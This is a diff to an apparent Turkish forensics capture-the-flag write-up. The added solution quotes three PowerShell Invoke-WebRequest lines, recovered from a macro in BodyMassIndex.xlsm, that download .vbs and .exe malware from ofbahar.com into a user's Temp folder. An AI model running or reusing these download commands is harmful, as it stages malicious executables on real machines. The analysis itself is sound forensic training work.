@@ -1161,13 +1161,25 @@ dumpcap.exe
 
 ## Solution
 
+BodyMassIndex.xlsm dosyasındaki makroyu decode ettiğimizde aşağıdaki powershell kodlarına ulaşmıştık. 
+Executable dosyaların indirildiği konum kodda gözüküyor.
+```
+Invoke-WebRequest -Uri http://ofbahar.com/notamalware.vbs -OutFile C:\Users\RickMartinGrimes\AppData\Local\Temp\notamalware.vbs
+Invoke-WebRequest -Uri http://ofbahar.com/accesstoken.exe -OutFile C:\Users\RickMartinGrimes\AppData\Local\Temp\AccessToken.exe 
+Invoke-WebRequest -Uri http://ofbahar.com/BodyMassIndex.exe -OutFile C:\Users\RickMartinGrimes\AppData\Local\Temp\BodyMassIndex.exe
+```
+
+Cevap:
+```
+C:\Users\RickMartinGrimes\AppData\Local\Temp\
+```
+
 # 27. Soru
 
 ## Description
 > What is the creation time value of the downloaded malicious executables?
 
 ## Solution
-
 # 28. Soru
 
 ## Description
